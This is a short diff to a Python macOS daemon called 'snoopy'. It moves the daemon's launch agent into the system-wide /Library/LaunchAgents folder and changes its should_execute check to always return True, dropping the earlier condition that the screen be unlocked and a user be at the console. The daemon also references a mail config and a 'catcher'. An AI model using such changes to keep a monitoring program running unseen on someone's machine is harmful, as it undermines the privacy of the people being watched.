@@ -15,7 +15,8 @@ home              = os.getenv("HOME")
 directory         = 'HOME_DIRECTORY'
 config_dir        = '{}/config'.format(directory)
 installation_path = '{}/dist/snoopy'.format(directory)
-launchd_path      = '{}/Library/LaunchAgents'.format(home)
+# launchd_path      = '{}/Library/LaunchAgents'.format(home)
+launchd_path      = '/Library/LaunchAgents'
 secret_key        = 'SUPER_SECRET_KEY'
 mail_config       = 'mail.config'
 reloader_name     = 'a.out'
@@ -36,12 +37,13 @@ class MyDaemon(Daemon):
             directory,
             catcher)
 
-    def should_execute():
-        d = Quartz.CGSessionCopyCurrentDictionary()
-        return (
-            d and
-            d.get("CGSSessionScreenIsLocked", 0) == 0 and
-            d.get("kCGSSessionOnConsoleKey", 0) == 1)
+    def should_execute(self):
+        return True
+        # d = Quartz.CGSessionCopyCurrentDictionary()
+        # return (
+        #     d and
+        #     d.get("CGSSessionScreenIsLocked", 0) == 0 and
+        #     d.get("kCGSSessionOnConsoleKey", 0) == 1)
 
     def setup(self):
         # the graceful killer registers events on init
